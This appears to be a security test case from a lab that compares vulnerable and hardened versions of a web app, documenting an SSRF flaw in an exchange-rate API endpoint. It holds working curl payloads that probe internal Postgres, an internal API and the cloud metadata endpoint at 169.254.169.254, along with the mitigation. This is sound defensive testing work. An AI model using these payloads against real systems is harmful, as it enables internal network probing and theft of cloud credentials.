# T06 — SSRF in /api/exchange-rate

## Wektor ataku
OWASP A10:2021 (SSRF). User-controlled `?api_url=` parameter passed to `fetch()`.

## Setup
1. `git checkout baseline`
2. `pnpm dev`

## Payload
```bash
# Probe internal Postgres
curl "http://localhost:3000/api/exchange-rate?api_url=http://localhost:5432"
# Probe cloud metadata (would work if running on AWS EC2)
curl "http://localhost:3000/api/exchange-rate?api_url=http://169.254.169.254/latest/meta-data/"
# Probe file:// (Node fetch doesn't support file://, but local services on other ports do)
curl "http://localhost:3000/api/exchange-rate?api_url=http://localhost:3000/api/listings"
```

## Expected result per variant
- **baseline:** server's HTTP client connects to arbitrary host; response leaked to attacker
- **typical:** user controls only currency code interpolated into URL string. Limited to `?currency=EUR%26foo=bar` style escapes (mostly cosmetic)
- **hardened:** non-allowlisted currency returns 400; only `https://api.exchangerate.host/latest` reachable; 5s timeout

## Verification tools
- Manual curl
- Burp (Collaborator for OOB)

## Mitigation reference
`hardened`: `src/app/api/exchange-rate/route.ts` — `ALLOWED_CURRENCIES` set, hardcoded `ALLOWED_API`.
